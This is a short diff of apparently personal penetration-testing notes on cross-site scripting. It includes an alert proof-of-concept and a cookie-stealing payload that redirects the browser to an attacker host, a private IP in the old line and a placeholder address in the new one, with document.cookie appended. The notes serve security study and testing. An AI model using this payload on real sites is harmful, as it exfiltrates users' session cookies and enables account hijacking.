@@ -68,7 +68,7 @@ Cross-Site Scripting (XSS)
       - have to proof of concept make sure there is javascript to XSS
         -  `<script>alert('XSS')</script>` - maybe use double quotes
           - put this in a field that looks like its vulnerable to cross site scripting  
-          - `<script>document.location="http://10.50.22.27/uploads/cookie_stealer.php?username=+document.cookie;</script>`
+          - `<script>document.location="http://X.X.X.X/uploads/cookies.php?username="+document.cookie;</script>`
 
 Server-Side Injection
   - Directory Traversal/Path Traversal
